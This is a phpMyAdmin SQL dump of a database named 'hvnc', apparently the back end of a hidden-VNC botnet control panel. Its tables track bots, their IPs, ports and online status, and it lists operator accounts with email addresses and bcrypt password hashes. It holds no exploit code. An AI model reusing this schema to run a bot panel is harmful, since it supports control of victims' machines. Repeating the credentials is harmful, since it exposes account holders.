-- phpMyAdmin SQL Dump
-- version 4.6.6deb4
-- https://www.phpmyadmin.net/
--
-- Хост: localhost
-- Время создания: Янв 08 2019 г., 11:23
-- Версия сервера: 10.1.26-MariaDB-0+deb9u1
-- Версия PHP: 7.0.30-0+deb9u1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `hvnc`
--

-- --------------------------------------------------------

--
-- Структура таблицы `backclients`
--

CREATE TABLE `backclients` (
  `id` int(20) UNSIGNED NOT NULL,
  `botid` varchar(36) NOT NULL,
  `botip` varchar(16) NOT NULL,
  `type` varchar(10) NOT NULL,
  `botport` int(11) NOT NULL,
  `onlinefrom` datetime NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `backhistory`
--

CREATE TABLE `backhistory` (
  `botid` varchar(36) NOT NULL,
  `type` int(11) NOT NULL,
  `port` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `bots`
--

CREATE TABLE `bots` (
  `id` int(11) NOT NULL,
  `country` text NOT NULL,
  `dateadd` datetime NOT NULL,
  `comment` text NOT NULL,
  `botid` text NOT NULL,
  `botip` text NOT NULL,
  `deleted` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `ci_sessions`
--

CREATE TABLE `ci_sessions` (
  `id` varchar(40) NOT NULL,
  `ip_address` varchar(45) NOT NULL,
  `timestamp` int(10) UNSIGNED NOT NULL DEFAULT '0',
  `data` blob NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Структура таблицы `groups`
--

CREATE TABLE `groups` (
  `id` int(11) NOT NULL,
  `groupname` text NOT NULL,
  `comment` text NOT NULL,
  `date_created` datetime NOT NULL,
  `of_bots` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `settings`
--

CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `options` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Дамп данных таблицы `settings`
--

INSERT INTO `settings` (`id`, `options`) VALUES
(1, '0'),
(2, '127.0.0.1'),
(3, '1541078127');

-- --------------------------------------------------------

--
-- Структура таблицы `users`
--

CREATE TABLE `users` (
  `id` int(11) UNSIGNED NOT NULL,
  `username` varchar(255) NOT NULL DEFAULT '',
  `email` varchar(255) NOT NULL DEFAULT '',
  `password` varchar(255) NOT NULL DEFAULT '',
  `avatar` varchar(255) DEFAULT 'default.jpg',
  `created_at` datetime NOT NULL,
  `updated_at` datetime DEFAULT NULL,
  `is_admin` tinyint(1) UNSIGNED NOT NULL DEFAULT '0',
  `is_confirmed` tinyint(1) UNSIGNED NOT NULL DEFAULT '0',
  `is_deleted` tinyint(1) UNSIGNED NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Дамп данных таблицы `users`
--

INSERT INTO `users` (`id`, `username`, `email`, `password`, `avatar`, `created_at`, `updated_at`, `is_admin`, `is_confirmed`, `is_deleted`) VALUES
(1, 'DukeEugene', 'malwarevip@protonmail.com', '$2y$10$axpRFLGYUxdmpqB.OF1i.uY4mG/KYYsY4Yt5U0.QojZQ6xHPRsHdy', 'default.jpg', '2018-10-23 15:44:16', NULL, 1, 1, 0),
(5, 'admin', 'friend1010@protonmail.com', '$2y$10$spnGNCxTKtAQNDb375BZ/e0qWoiPB12JdhZH.HFjdSHCdknUV84xi', 'default.jpg', '2019-01-02 16:03:18', NULL, 0, 0, 0);

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `backclients`
--
ALTER TABLE `backclients`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `backid` (`botid`,`type`);

--
-- Индексы таблицы `backhistory`
--
ALTER TABLE `backhistory`
  ADD PRIMARY KEY (`botid`,`type`);

--
-- Индексы таблицы `bots`
--
ALTER TABLE `bots`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`);

--
-- Индексы таблицы `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `backclients`
--
ALTER TABLE `backclients`
  MODIFY `id` int(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2233;
--
-- AUTO_INCREMENT для таблицы `bots`
--
ALTER TABLE `bots`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=506;
--
-- AUTO_INCREMENT для таблицы `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT для таблицы `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
